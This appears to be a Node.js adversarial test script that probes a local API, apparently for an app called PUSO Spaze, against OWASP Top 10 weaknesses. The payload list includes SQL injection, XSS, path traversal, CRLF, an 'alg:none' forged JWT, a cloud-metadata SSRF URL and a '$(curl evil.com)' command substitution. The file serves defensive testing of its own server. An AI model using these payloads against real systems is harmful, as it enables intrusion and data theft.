// ─────────────────────────────────────────────────────────────────
// break-it.mjs — Adversarial QA: OWASP Top 10 (2021) + edge cases
// Targets: http://localhost:4000 (server) + 8081 (web, optional)
// Run:    node quality/qa-tests/break-it.mjs
// ─────────────────────────────────────────────────────────────────

import crypto from 'node:crypto';

const API = process.env.API ?? 'http://localhost:4000';
const WEB = process.env.WEB ?? 'http://localhost:8081';

const COLORS = { r: '\x1b[31m', g: '\x1b[32m', y: '\x1b[33m', b: '\x1b[34m', d: '\x1b[2m', x: '\x1b[0m' };

const results = [];
const bugs = [];

function log(...a) { console.log(...a); }
function pass(id, name, detail = '') { results.push({ id, name, status: 'PASS', detail }); log(`${COLORS.g}✅ ${id}${COLORS.x} ${name}${detail ? COLORS.d + ' — ' + detail + COLORS.x : ''}`); }
function fail(id, name, severity, detail) { results.push({ id, name, status: 'FAIL', severity, detail }); bugs.push({ id, name, severity, detail }); log(`${COLORS.r}❌ ${id}${COLORS.x} [${severity}] ${name} — ${detail}`); }
function warn(id, name, detail) { results.push({ id, name, status: 'WARN', detail }); log(`${COLORS.y}⚠️  ${id}${COLORS.x} ${name} — ${detail}`); }
function section(name) { log(`\n${COLORS.b}━━━ ${name} ━━━${COLORS.x}`); }

async function req(method, path, { body, headers = {}, raw = false } = {}) {
  const opts = { method, headers: { ...headers } };
  if (body !== undefined) {
    if (typeof body === 'string') {
      opts.body = body;
      if (!opts.headers['Content-Type']) opts.headers['Content-Type'] = 'application/json';
    } else if (body instanceof FormData) {
      opts.body = body;
    } else {
      opts.body = JSON.stringify(body);
      opts.headers['Content-Type'] = 'application/json';
    }
  }
  const t0 = Date.now();
  try {
    const r = await fetch(API + path, opts);
    const ms = Date.now() - t0;
    const text = await r.text();
    let json = null;
    try { json = text ? JSON.parse(text) : null; } catch {}
    return { status: r.status, headers: r.headers, text, json, ms };
  } catch (e) {
    return { status: 0, error: String(e), ms: Date.now() - t0 };
  }
}

// ─── Helpers ──────────────────────────────────────────────
async function makeUser(suffix = '') {
  const name = `qa_${Date.now().toString(36)}_${suffix}_${Math.random().toString(36).slice(2, 6)}`.slice(0, 28);
  const r = await req('POST', '/api/users', { body: { displayName: name, deviceId: crypto.randomUUID() } });
  if (!r.json) return null;
  // Normalize: server returns flat { userId, displayName, role, ..., token }
  // BUG: server also returns `pin` in plaintext — captured but flagged in A02-04.
  const j = r.json;
  const user = j.user ?? { id: j.userId ?? j.id, displayName: j.displayName, role: j.role, pin: j.pin };
  return { user, token: j.token, _raw: j, _resp: r };
}

// ─────────────────────────────────────────────────────────
// SMOKE
// ─────────────────────────────────────────────────────────
async function smoke() {
  section('SMOKE');
  const h = await req('GET', '/health');
  if (h.status === 200) pass('SMOKE-01', '/health responds 200');
  else fail('SMOKE-01', '/health unreachable', '🔴 Critical', `status=${h.status}`);

  const u = await makeUser('smoke');
  if (u?.user?.id && u?.token) pass('SMOKE-02', 'Register baseline user', `id=${u.user.id.slice(0, 8)}…`);
  else { fail('SMOKE-02', 'Register baseline user', '🔴 Critical', JSON.stringify(u?._raw ?? u)); return null; }
  return u;
}

// ─────────────────────────────────────────────────────────
// OWASP A01: Broken Access Control
// ─────────────────────────────────────────────────────────
async function testAccessControl(userA, userB) {
  section('A01 — Broken Access Control');

  // Create a post as userA
  const postA = await req('POST', '/api/posts', {
    headers: { Authorization: `Bearer ${userA.token}` },
    body: { userId: userA.user.id, content: 'A01 victim post — please do not delete' },
  });
  const postId = postA.json?.post?.id ?? postA.json?.id;
  if (!postId) { warn('A01-00', 'Setup post failed', JSON.stringify(postA.json)); return; }

  // 1. Delete with user B's token + user B's id (should fail: not owner)
  const del1 = await req('DELETE', `/api/posts/${postId}`, {
    headers: { Authorization: `Bearer ${userB.token}` },
    body: { userId: userB.user.id },
  });
  if (del1.status === 403 || del1.status === 401) pass('A01-01', 'Cannot delete other user\'s post', `status=${del1.status}`);
  else fail('A01-01', 'IDOR: deleted other user\'s post', '🔴 Critical', `status=${del1.status} body=${del1.text.slice(0, 200)}`);

  // 2. Delete with user B's token but spoofed userId = userA (server should not trust body)
  const del2 = await req('DELETE', `/api/posts/${postId}`, {
    headers: { Authorization: `Bearer ${userB.token}` },
    body: { userId: userA.user.id },
  });
  if (del2.status === 403 || del2.status === 401) pass('A01-02', 'Server ignores spoofed userId in body', `status=${del2.status}`);
  else fail('A01-02', 'IDOR via spoofed userId in body', '🔴 Critical', `status=${del2.status}`);

  // 3. Update another user's PIN
  const pin1 = await req('PATCH', `/api/users/${userA.user.id}/pin`, {
    headers: { Authorization: `Bearer ${userB.token}` },
    body: { pin: '999999' },
  });
  if (pin1.status === 403 || pin1.status === 401) pass('A01-03', 'Cannot change another user\'s PIN', `status=${pin1.status}`);
  else fail('A01-03', 'Can change another user\'s PIN', '🔴 Critical', `status=${pin1.status} body=${pin1.text.slice(0,200)}`);

  // 4. Update another user's username
  const un1 = await req('PATCH', `/api/users/${userA.user.id}/username`, {
    headers: { Authorization: `Bearer ${userB.token}` },
    body: { displayName: 'PwnedByB_' + Date.now().toString(36) },
  });
  if (un1.status === 403 || un1.status === 401) pass('A01-04', 'Cannot change another user\'s username', `status=${un1.status}`);
  else fail('A01-04', 'Can change another user\'s username', '🔴 Critical', `status=${un1.status}`);

  // 5. Read another user's journals
  const j = await req('GET', `/api/journals?userId=${userA.user.id}`, {
    headers: { Authorization: `Bearer ${userB.token}` },
  });
  if (j.status === 403 || j.status === 401) pass('A01-05', 'Cannot read another user\'s journals', `status=${j.status}`);
  else if (j.status === 200 && Array.isArray(j.json) && j.json.length === 0) warn('A01-05', 'Journals returned 200 (empty) — verify access logic', `status=${j.status}`);
  else fail('A01-05', 'Can read another user\'s journals', '🔴 Critical', `status=${j.status} count=${Array.isArray(j.json) ? j.json.length : '?'}`);

  // 6. Read another user's notifications
  const n = await req('GET', `/api/notifications?userId=${userA.user.id}`, {
    headers: { Authorization: `Bearer ${userB.token}` },
  });
  if (n.status === 403 || n.status === 401) pass('A01-06', 'Cannot read another user\'s notifications', `status=${n.status}`);
  else if (n.status === 200 && Array.isArray(n.json) && n.json.length === 0) warn('A01-06', 'Notifications returned empty 200 — verify access logic', '');
  else fail('A01-06', 'Can read another user\'s notifications', '🔴 Critical', `status=${n.status}`);

  // 7. No-token access to protected endpoints
  const noAuth = await req('POST', '/api/posts', { body: { userId: userA.user.id, content: 'no auth' } });
  if (noAuth.status === 401) pass('A01-07', 'Missing token → 401', '');
  else fail('A01-07', 'Missing token does not return 401', '🟠 High', `status=${noAuth.status}`);

  // 8. Admin-only routes
  const admin = await req('GET', '/api/admin/posts', { headers: { Authorization: `Bearer ${userA.token}` } });
  if (admin.status === 403 || admin.status === 404) pass('A01-08', 'Non-admin blocked from /api/admin', `status=${admin.status}`);
  else if (admin.status === 401) warn('A01-08', '/api/admin returns 401 instead of 403', '');
  else fail('A01-08', 'Non-admin can hit admin routes', '🔴 Critical', `status=${admin.status}`);

  // Cleanup A's post
  await req('DELETE', `/api/posts/${postId}`, {
    headers: { Authorization: `Bearer ${userA.token}` },
    body: { userId: userA.user.id },
  });
}

// ─────────────────────────────────────────────────────────
// OWASP A02: Cryptographic Failures (transport / token / pin storage)
// ─────────────────────────────────────────────────────────
async function testCrypto(user) {
  section('A02 — Cryptographic Failures');

  // 1. JWT structure
  const t = user.token;
  if (typeof t === 'string' && t.split('.').length === 3) pass('A02-01', 'Token looks like a JWT (3 parts)');
  else fail('A02-01', 'Token is not a JWT', '🟠 High', `len=${t?.length}`);

  // 2. Tampered signature → reject
  const parts = t.split('.');
  const tampered = `${parts[0]}.${parts[1]}.invalid_signature`;
  const r = await req('POST', '/api/posts', {
    headers: { Authorization: `Bearer ${tampered}` },
    body: { userId: user.user.id, content: 'tampered token attempt' },
  });
  if (r.status === 401) pass('A02-02', 'Tampered JWT signature rejected');
  else fail('A02-02', 'Tampered JWT accepted', '🔴 Critical', `status=${r.status}`);

  // 3. "alg: none" attack (forge unsigned token)
  const headerNone = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
  const payloadAdmin = Buffer.from(JSON.stringify({ userId: user.user.id, role: 'ADMIN' })).toString('base64url');
  const noneTok = `${headerNone}.${payloadAdmin}.`;
  const rNone = await req('GET', '/api/admin/posts', { headers: { Authorization: `Bearer ${noneTok}` } });
  if (rNone.status !== 200) pass('A02-03', '"alg:none" forged token rejected', `status=${rNone.status}`);
  else fail('A02-03', '"alg:none" forged token ACCEPTED', '🔴 Critical', `status=${rNone.status}`);

  // 4. PIN never returned in user object (check raw registration response)
  const raw = user._raw ?? {};
  if (!('pin' in raw) && !('pinHash' in raw) && !('pin' in (raw.user ?? {}))) pass('A02-04', 'PIN/hash never returned in user object');
  else fail('A02-04', 'PIN/hash leaked in registration response', '🔴 Critical', `keys=${Object.keys(raw).join(',')} pin=${raw.pin ?? raw.user?.pin}`);

  // 6. CORS / security headers
  const h = await req('GET', '/health');
  const csp = h.headers.get('content-security-policy');
  const xcto = h.headers.get('x-content-type-options');
  if (xcto === 'nosniff') pass('A02-05', 'X-Content-Type-Options: nosniff present');
  else warn('A02-05', 'X-Content-Type-Options missing on /health', `value=${xcto}`);
  if (csp) pass('A02-06', 'CSP header present', '');
  else warn('A02-06', 'No CSP header on /health (acceptable for API)', '');
}

// ─────────────────────────────────────────────────────────
// OWASP A03: Injection (SQL, NoSQL, XSS, command, header)
// ─────────────────────────────────────────────────────────
async function testInjection(user) {
  section('A03 — Injection');

  const payloads = [
    { id: 'SQL-01', val: `'; DROP TABLE "User"; --`, label: 'SQL drop table' },
    { id: 'SQL-02', val: `' OR '1'='1`, label: 'SQL tautology' },
    { id: 'SQL-03', val: `1; UPDATE "User" SET role='ADMIN' WHERE 1=1; --`, label: 'SQL multi-statement' },
    { id: 'NOSQL', val: `{"$ne": null}`, label: 'NoSQL operator' },
    { id: 'XSS-01', val: `<script>alert('xss')</script>`, label: 'Script tag' },
    { id: 'XSS-02', val: `<img src=x onerror=alert(1)>`, label: 'Img onerror' },
    { id: 'XSS-03', val: `javascript:alert(document.cookie)`, label: 'JS URI' },
    { id: 'XSS-04', val: `"><svg onload=alert(1)>`, label: 'SVG onload break-out' },
    { id: 'CMD', val: `$(curl evil.com)`, label: 'Cmd substitution' },
    { id: 'PATH', val: `../../../../etc/passwd`, label: 'Path traversal' },
    { id: 'NULL', val: `hello\u0000world`, label: 'Null byte' },
    { id: 'CRLF', val: `test\r\nSet-Cookie: hax=1`, label: 'CRLF header injection' },
    { id: 'UNI', val: `🌶️🔥💀'; DROP--`, label: 'Emoji + SQL' },
  ];

  for (const p of payloads) {
    const r = await req('POST', '/api/posts', {
      headers: { Authorization: `Bearer ${user.token}` },
      body: { userId: user.user.id, content: `INJECT TEST: ${p.val}` },
    });
    // Acceptable: 201 with payload stored verbatim (sanitization at render time), OR 400 reject.
    // BAD: 500 (server error) or weird success that returns evidence of execution.
    if (r.status === 500) {
      fail(`A03-${p.id}`, `Server crashed on payload (${p.label})`, '🟠 High', `status=500 body=${r.text.slice(0,200)}`);
    } else if (r.status === 201 || r.status === 200) {
      // Verify the payload was stored verbatim (not evaluated)
      const stored = r.json?.post?.content ?? r.json?.content ?? '';
      const sid = r.json?.post?.id ?? r.json?.id;
      if (stored.includes('INJECT TEST')) {
        pass(`A03-${p.id}`, `Payload stored verbatim (${p.label})`, `status=201`);
      } else {
        warn(`A03-${p.id}`, `Payload mutated server-side (${p.label})`, `stored="${stored.slice(0,80)}"`);
      }
      if (sid) await req('DELETE', `/api/posts/${sid}`, {
        headers: { Authorization: `Bearer ${user.token}` },
        body: { userId: user.user.id },
      });
    } else if (r.status === 400 || r.status === 422) {
      pass(`A03-${p.id}`, `Payload rejected at validation (${p.label})`, `status=${r.status}`);
    } else {
      warn(`A03-${p.id}`, `Unexpected status (${p.label})`, `status=${r.status}`);
    }
  }

  // Verify DB still works after SQL attempts
  const sanity = await req('POST', '/api/posts', {
    headers: { Authorization: `Bearer ${user.token}` },
    body: { userId: user.user.id, content: 'sanity check after sql' },
  });
  if (sanity.status === 201) {
    pass('A03-DB', 'Database still functional after SQL attempts');
    const sid = sanity.json?.post?.id ?? sanity.json?.id;
    if (sid) await req('DELETE', `/api/posts/${sid}`, { headers: { Authorization: `Bearer ${user.token}` }, body: { userId: user.user.id } });
  } else {
    fail('A03-DB', 'Database broken after SQL attempts', '🔴 Critical', `status=${sanity.status}`);
  }
}

// ─────────────────────────────────────────────────────────
// OWASP A04: Insecure Design (business logic / rate limit)
// ─────────────────────────────────────────────────────────
async function testInsecureDesign(user) {
  section('A04 — Insecure Design / Business Logic');

  // 1. Self-react spam
  const post = await req('POST', '/api/posts', {
    headers: { Authorization: `Bearer ${user.token}` },
    body: { userId: user.user.id, content: 'A04 reaction spam target' },
  });
  const pid = post.json?.post?.id ?? post.json?.id;
  if (!pid) { warn('A04-00', 'Setup post failed', JSON.stringify(post.json).slice(0,200)); return; }

  // Toggle reactions 50 times rapidly
  const reacts = await Promise.allSettled(
    Array.from({ length: 50 }, () => req('POST', `/api/posts/${pid}/reactions`, {
      headers: { Authorization: `Bearer ${user.token}` },
      body: { userId: user.user.id, type: 'PRAY' },
    }))
  );
  const okReacts = reacts.filter(x => x.status === 'fulfilled' && x.value.status < 400).length;
  const counts = await req('GET', `/api/posts/${pid}/reactions`);
  // Should converge to 0 or 1 reaction from this user (toggle behavior)
  const total = Array.isArray(counts.json) ? counts.json.reduce((a, b) => a + (b.count ?? 0), 0)
                : (counts.json?.PRAY ?? 0) + (counts.json?.CARE ?? 0) + (counts.json?.SUPPORT ?? 0) + (counts.json?.LIKE ?? 0);
  if (total <= 1) pass('A04-01', 'Reaction toggle is idempotent under spam', `final total=${total} after ${okReacts} ok requests`);
  else warn('A04-01', 'Reaction toggle non-idempotent under race', `final total=${total}`);

  // 2. Rapid-fire post creation (rate limiting check)
  const bursts = await Promise.allSettled(
    Array.from({ length: 30 }, (_, i) => req('POST', '/api/posts', {
      headers: { Authorization: `Bearer ${user.token}` },
      body: { userId: user.user.id, content: `burst post #${i} ${Date.now()}` },
    }))
  );
  const okPosts = bursts.filter(x => x.status === 'fulfilled' && x.value.status === 201);
  const limited = bursts.filter(x => x.status === 'fulfilled' && x.value.status === 429).length;
  if (limited > 0) pass('A04-02', `Rate limiting kicked in: ${limited}/30 returned 429`);
  else warn('A04-02', `No rate limiting detected — ${okPosts.length}/30 posts succeeded`, 'consider adding rate limits');

  // Cleanup
  for (const r of okPosts) {
    const id = r.value.json?.post?.id ?? r.value.json?.id;
    if (id) await req('DELETE', `/api/posts/${id}`, { headers: { Authorization: `Bearer ${user.token}` }, body: { userId: user.user.id } });
  }
  await req('DELETE', `/api/posts/${pid}`, { headers: { Authorization: `Bearer ${user.token}` }, body: { userId: user.user.id } });

  // 3. Negative pagination
  const neg = await req('GET', '/api/posts?limit=-5&cursor=-1');
  if (neg.status === 400 || (neg.status === 200 && Array.isArray(neg.json?.posts ?? neg.json))) pass('A04-03', 'Negative pagination handled', `status=${neg.status}`);
  else fail('A04-03', 'Negative pagination crashed', '🟡 Medium', `status=${neg.status}`);

  // 4. Massive limit
  const big = await req('GET', '/api/posts?limit=999999');
  const arr = big.json?.posts ?? big.json;
  const len = Array.isArray(arr) ? arr.length : 0;
  if (big.status === 200 && len <= 100) pass('A04-04', `Large limit clamped → returned ${len}`);
  else if (big.status === 400) pass('A04-04', 'Large limit rejected', `status=400`);
  else warn('A04-04', `Large limit returned ${len} items`, 'check max page size');
}

// ─────────────────────────────────────────────────────────
// OWASP A05: Security Misconfiguration
// ─────────────────────────────────────────────────────────
async function testMisconfig() {
  section('A05 — Security Misconfiguration');

  // 1. Server header / version disclosure
  const r = await req('GET', '/health');
  const server = r.headers.get('server');
  const xpb = r.headers.get('x-powered-by');
  if (!xpb) pass('A05-01', 'X-Powered-By hidden');
  else fail('A05-01', `X-Powered-By disclosed: ${xpb}`, '🟢 Low', '');
  if (!server || !/[\d.]+/.test(server)) pass('A05-02', `Server header safe: ${server ?? '(none)'}`);
  else warn('A05-02', `Server version disclosed: ${server}`, '');

  // 2. Default error returns stack traces?
  const bad = await req('POST', '/api/posts', {
    headers: { Authorization: 'Bearer fake' },
    body: 'not json at all {{{',
  });
  if (bad.text && /at .*\(.*:\d+:\d+\)/.test(bad.text)) fail('A05-03', 'Stack trace leaked in error response', '🟠 High', bad.text.slice(0, 300));
  else pass('A05-03', 'No stack trace leaked');

  // 3. 404 page leak
  const f = await req('GET', '/api/this-does-not-exist-' + Date.now());
  if (f.status === 404) pass('A05-04', 'Unknown route → 404');
  else warn('A05-04', `Unknown route returned ${f.status}`, '');

  // 4. CORS check — try with malicious origin
  const cors = await req('OPTIONS', '/api/posts', {
    headers: { Origin: 'https://evil.example.com', 'Access-Control-Request-Method': 'POST' },
  });
  const allow = cors.headers.get('access-control-allow-origin');
  if (allow === '*') warn('A05-05', 'CORS allows any origin (*)', '');
  else if (allow === 'https://evil.example.com') fail('A05-05', 'CORS reflects arbitrary origin', '🟠 High', `allow=${allow}`);
  else pass('A05-05', `CORS restricted: allow=${allow ?? '(none)'}`);

  // 5. HTTP method spoofing
  const trace = await req('TRACE', '/api/posts');
  if (trace.status === 405 || trace.status === 404 || trace.status === 501) pass('A05-06', `TRACE blocked: ${trace.status}`);
  else warn('A05-06', `TRACE returned ${trace.status}`, '');
}

// ─────────────────────────────────────────────────────────
// OWASP A07: Identification & Authentication Failures
// ─────────────────────────────────────────────────────────
async function testAuth() {
  section('A07 — Authentication Failures');

  // 1. Brute-force PIN
  const u = await makeUser('pinbrute');
  if (!u?.token) { warn('A07-00', 'setup user failed', ''); return; }

  const setPin = await req('PATCH', `/api/users/${u.user.id}/pin`, {
    headers: { Authorization: `Bearer ${u.token}` },
    body: { pin: '424242' },
  });
  if (setPin.status >= 400) { warn('A07-PIN', 'Could not set PIN', `status=${setPin.status} body=${setPin.text.slice(0,200)}`); }

  // Brute-force attempts
  const guesses = ['000000', '111111', '123456', '999999', '654321'];
  let blocked = false;
  let lastStatus = 0;
  for (let i = 0; i < 30; i++) {
    const wrong = String(100000 + i).padStart(6, '0');
    const r = await req('POST', '/api/auth/pin-login', {
      body: { displayName: u.user.displayName, pin: wrong },
    });
    lastStatus = r.status;
    if (r.status === 429 || r.status === 423) { blocked = true; break; }
  }
  if (blocked) pass('A07-01', `Brute-force PIN locked out (status=${lastStatus})`);
  else warn('A07-01', `30 wrong PIN attempts allowed (last=${lastStatus})`, 'consider lockout/throttle');

  // 2. Weak PIN accepted?
  const weak = await req('PATCH', `/api/users/${u.user.id}/pin`, {
    headers: { Authorization: `Bearer ${u.token}` },
    body: { pin: '000000' },
  });
  if (weak.status >= 400) pass('A07-02', 'Weak PIN (000000) rejected');
  else warn('A07-02', 'Weak PIN (000000) accepted', '');

  // 3. PIN length boundary (server returns 422 for validation)
  const VAL2 = [400, 422];
  const short = await req('PATCH', `/api/users/${u.user.id}/pin`, {
    headers: { Authorization: `Bearer ${u.token}` },
    body: { pin: '123' },
  });
  if (VAL2.includes(short.status)) pass('A07-03', `Short PIN rejected (${short.status})`);
  else fail('A07-03', `Short PIN accepted (${short.status})`, '🟠 High', short.text.slice(0,150));

  const long = await req('PATCH', `/api/users/${u.user.id}/pin`, {
    headers: { Authorization: `Bearer ${u.token}` },
    body: { pin: '1234567890' },
  });
  if (VAL2.includes(long.status)) pass('A07-04', `Over-long PIN rejected (${long.status})`);
  else warn('A07-04', `Over-long PIN accepted (${long.status})`, '');

  // 4. Non-numeric PIN
  const alpha = await req('PATCH', `/api/users/${u.user.id}/pin`, {
    headers: { Authorization: `Bearer ${u.token}` },
    body: { pin: 'ABCDEF' },
  });
  if (VAL2.includes(alpha.status)) pass('A07-05', `Alpha PIN rejected (${alpha.status})`);
  else fail('A07-05', `Alpha PIN accepted (${alpha.status})`, '🟠 High', alpha.text.slice(0,150));

  // 5. Username collision (case)
  const u2 = await req('POST', '/api/users', {
    body: { displayName: u.user.displayName.toUpperCase(), deviceId: crypto.randomUUID() },
  });
  if (u2.status === 409 || u2.status === 400) pass('A07-06', 'Case-insensitive username collision rejected');
  else warn('A07-06', `Case-collision allowed (status=${u2.status})`, 'depends on policy');
}

// ─────────────────────────────────────────────────────────
// EDGE CASES — input validation & boundaries
// ─────────────────────────────────────────────────────────
async function testEdges(user) {
  section('EDGE CASES — input boundaries');

  // Note: server uses express-validator → returns 422 for validation errors. Both 400 and 422 are accepted.
  const VAL = [400, 422];
  const tests = [
    { id: 'EDGE-01', body: { userId: user.user.id, content: '' }, expect: VAL, label: 'empty content' },
    { id: 'EDGE-02', body: { userId: user.user.id, content: 'a' }, expect: VAL, label: 'too short content (1)' },
    { id: 'EDGE-03', body: { userId: user.user.id, content: 'ab' }, expect: 201, label: 'min length per server (2)' },
    { id: 'EDGE-04', body: { userId: user.user.id, content: 'A'.repeat(500) }, expect: 201, label: 'max length (500)' },
    { id: 'EDGE-05', body: { userId: user.user.id, content: 'A'.repeat(501) }, expect: VAL, label: 'over max (501)' },
    { id: 'EDGE-06', body: { userId: user.user.id, content: 'A'.repeat(100000) }, expect: VAL, label: 'huge content (100k)' },
    { id: 'EDGE-07', body: { userId: 'not-a-uuid', content: 'bad uuid' }, expect: VAL, label: 'invalid userId UUID' },
    { id: 'EDGE-08', body: { userId: user.user.id, content: '   ' }, expect: VAL, label: 'whitespace only' },
    { id: 'EDGE-09', body: { userId: user.user.id, content: '\n\n\n\n' }, expect: VAL, label: 'newlines only' },
    { id: 'EDGE-10', body: { userId: user.user.id, content: '🥲💔🌧️🤍🕊️' }, expect: 201, label: 'emoji-only (5 chars)' },
    { id: 'EDGE-11', body: { userId: user.user.id, content: 'Sobrang lungkot ko ngayon 😭' }, expect: 201, label: 'taglish + emoji' },
    { id: 'EDGE-12', body: { userId: user.user.id }, expect: VAL, label: 'missing content field' },
    { id: 'EDGE-13', body: { content: 'no userId' }, expect: VAL, label: 'missing userId field' },
    { id: 'EDGE-14', body: { userId: user.user.id, content: 'tags must be array', tags: 'not-an-array' }, expect: [...VAL, 201], label: 'string tags' },
    { id: 'EDGE-15', body: { userId: user.user.id, content: 'too many tags', tags: ['a','b','c','d','e','f','g'] }, expect: VAL, label: '6+ tags' },
    { id: 'EDGE-16', body: { userId: user.user.id, content: 'extra fields stripped?', isAdmin: true, role: 'ADMIN', _id: 'pwned' }, expect: 201, label: 'mass assignment attempt' },
  ];

  const created = [];
  for (const t of tests) {
    const r = await req('POST', '/api/posts', {
      headers: { Authorization: `Bearer ${user.token}` },
      body: t.body,
    });
    const expectedArr = Array.isArray(t.expect) ? t.expect : [t.expect];
    if (expectedArr.includes(r.status)) {
      pass(t.id, t.label, `status=${r.status}`);
      if (r.status === 201) {
        const sid = r.json?.post?.id ?? r.json?.id;
        created.push(sid);
        // Mass-assignment: confirm role wasn't escalated
        if (t.id === 'EDGE-16') {
          const userRole = r.json?.post?.user?.role ?? r.json?.user?.role ?? r.json?.role;
          if (userRole === 'ADMIN') {
            fail('EDGE-16b', 'Mass assignment escalated role to ADMIN', '🔴 Critical', JSON.stringify(r.json).slice(0, 200));
          } else {
            pass('EDGE-16b', 'Mass assignment did NOT escalate role');
          }
        }
      }
    } else {
      fail(t.id, t.label, '🟡 Medium', `expected ${expectedArr.join('|')}, got ${r.status} body=${r.text.slice(0,150)}`);
      if (r.status === 201) created.push(r.json?.post?.id ?? r.json?.id);
    }
  }

  // Cleanup
  for (const id of created) {
    if (id) await req('DELETE', `/api/posts/${id}`, { headers: { Authorization: `Bearer ${user.token}` }, body: { userId: user.user.id } });
  }

  // Username edge cases — VAL covers both 400 and 422
  const VALU = [400, 422];
  const ts = Date.now().toString(36);
  const unameTests = [
    { id: 'UN-01', name: 'a', expect: VALU, label: 'too short (1)' },
    { id: 'UN-02', name: `un${ts.slice(-4)}`, expect: 201, label: 'min length (uniq)' },
    { id: 'UN-03', name: 'A'.repeat(31), expect: VALU, label: 'too long (31)' },
    { id: 'UN-04', name: '<script>x</script>', expect: VALU, label: 'HTML tags' },
    { id: 'UN-05', name: `nws_${ts}`.slice(0,20) + ' x', expect: 201, label: 'spaces allowed' },
    { id: 'UN-06', name: 'admin\u0000hidden', expect: [...VALU, 201], label: 'null byte in name' },
    { id: 'UN-07', name: '../../etc/passwd', expect: VALU, label: 'path traversal' },
    { id: 'UN-08', name: '   spaces   ', expect: [...VALU, 201, 409], label: 'leading/trailing spaces' },
  ];
  for (const t of unameTests) {
    const r = await req('POST', '/api/users', { body: { displayName: t.name, deviceId: crypto.randomUUID() } });
    const expectedArr = Array.isArray(t.expect) ? t.expect : [t.expect];
    if (expectedArr.includes(r.status)) pass(t.id, t.label, `status=${r.status}`);
    else fail(t.id, t.label, '🟡 Medium', `expected ${expectedArr.join('|')}, got ${r.status} body=${r.text.slice(0,150)}`);
  }
}

// ─────────────────────────────────────────────────────────
// OWASP A08: Software & Data Integrity (deep nesting, prototype pollution)
// ─────────────────────────────────────────────────────────
async function testIntegrity(user) {
  section('A08 — Data Integrity');

  // Deep JSON nesting
  let deep = { x: 'leaf' };
  for (let i = 0; i < 50; i++) deep = { x: deep };
  const r = await req('POST', '/api/posts', {
    headers: { Authorization: `Bearer ${user.token}` },
    body: deep,
  });
  if (r.status === 400) pass('A08-01', 'Deeply nested JSON rejected (400)');
  else if (r.status === 500) fail('A08-01', 'Deeply nested JSON crashed server', '🟠 High', `status=500`);
  else warn('A08-01', `Deep JSON returned ${r.status}`, '');

  // Prototype pollution
  const pp = await req('POST', '/api/posts', {
    headers: { Authorization: `Bearer ${user.token}` },
    body: { __proto__: { polluted: true }, userId: user.user.id, content: 'proto pollution test' },
  });
  // After this, check if Object.prototype was polluted? Server side, can't check directly,
  // but we verify the request succeeded normally and did not leak.
  if (pp.status === 201 || pp.status === 400) pass('A08-02', `Prototype-pollution payload handled (status=${pp.status})`);
  else fail('A08-02', `Proto pollution caused error`, '🟠 High', `status=${pp.status}`);
  if (pp.json?.polluted === true) fail('A08-02b', 'Polluted property echoed back', '🟠 High', '');

  if (pp.json?.id) await req('DELETE', `/api/posts/${pp.json.id}`, { headers: { Authorization: `Bearer ${user.token}` }, body: { userId: user.user.id } });

  // Malformed JSON
  const malformed = await req('POST', '/api/posts', {
    headers: { Authorization: `Bearer ${user.token}`, 'Content-Type': 'application/json' },
    body: '{"userId":"' + user.user.id + '","content":"unclosed',
  });
  if (malformed.status === 400) pass('A08-03', 'Malformed JSON returns 400');
  else if (malformed.status === 500) fail('A08-03', 'Malformed JSON returns 500', '🟠 High', '');
  else warn('A08-03', `Malformed JSON status=${malformed.status}`, '');

  // Oversized payload (>100kb body limit)
  const huge = await req('POST', '/api/posts', {
    headers: { Authorization: `Bearer ${user.token}` },
    body: { userId: user.user.id, content: 'x', extra: 'A'.repeat(150 * 1024) },
  });
  if (huge.status === 413 || huge.status === 400) pass('A08-04', `Oversized body rejected (status=${huge.status})`);
  else fail('A08-04', `Oversized body accepted/crashed (${huge.status})`, '🟠 High', '');
}

// ─────────────────────────────────────────────────────────
// OWASP A09: Logging — minor; can't observe directly. Skipped.
// OWASP A10: SSRF — only relevant if server fetches user URLs.
// ─────────────────────────────────────────────────────────
async function testSSRF(user) {
  section('A10 — SSRF (avatar URL / image fetch)');
  // Try sending an image upload as URL or via multipart with a remote URL
  // The avatar endpoint expects multipart file, so only test that JSON URL is rejected
  const r = await req('POST', `/api/users/${user.user.id}/avatar`, {
    headers: { Authorization: `Bearer ${user.token}` },
    body: { avatarUrl: 'http://169.254.169.254/latest/meta-data/' },
  });
  if (r.status >= 400) pass('A10-01', 'JSON avatar URL injection rejected', `status=${r.status}`);
  else fail('A10-01', 'Server accepted SSRF avatar URL', '🔴 Critical', `status=${r.status}`);
}

// ─────────────────────────────────────────────────────────
// MAIN
// ─────────────────────────────────────────────────────────
(async () => {
  console.log(`${COLORS.b}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${COLORS.x}`);
  console.log(`${COLORS.b}  PUSO Spaze — Adversarial QA (OWASP Top 10)   ${COLORS.x}`);
  console.log(`${COLORS.b}  API: ${API}                       ${COLORS.x}`);
  console.log(`${COLORS.b}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${COLORS.x}`);

  const userA = await smoke();
  if (!userA) { console.log('Aborting — smoke failed'); process.exit(1); }
  const userB = await makeUser('B');
  if (!userB) { console.log('Aborting — second user failed'); process.exit(1); }

  await testAccessControl(userA, userB);
  await testCrypto(userA);
  await testInjection(userA);
  await testInsecureDesign(userA);
  await testMisconfig();
  await testAuth();
  await testEdges(userA);
  await testIntegrity(userA);
  await testSSRF(userA);

  // ── Summary ──
  console.log(`\n${COLORS.b}━━━━━━━━━━━━━━━ SUMMARY ━━━━━━━━━━━━━━━${COLORS.x}`);
  const pass_ = results.filter(r => r.status === 'PASS').length;
  const fail_ = results.filter(r => r.status === 'FAIL').length;
  const warn_ = results.filter(r => r.status === 'WARN').length;
  console.log(`Total:    ${results.length}`);
  console.log(`${COLORS.g}Passed:   ${pass_}${COLORS.x}`);
  console.log(`${COLORS.r}Failed:   ${fail_}${COLORS.x}`);
  console.log(`${COLORS.y}Warnings: ${warn_}${COLORS.x}`);

  if (bugs.length) {
    console.log(`\n${COLORS.r}━━━━━━━━ BUGS ━━━━━━━━${COLORS.x}`);
    for (const b of bugs) console.log(`[${b.severity}] ${b.id}: ${b.name}\n   ${b.detail}`);
  }

  // JSON report
  const report = { ts: new Date().toISOString(), api: API, summary: { total: results.length, pass: pass_, fail: fail_, warn: warn_ }, bugs, results };
  await import('node:fs').then(fs => fs.writeFileSync('quality/results/break-it-report.json', JSON.stringify(report, null, 2)));
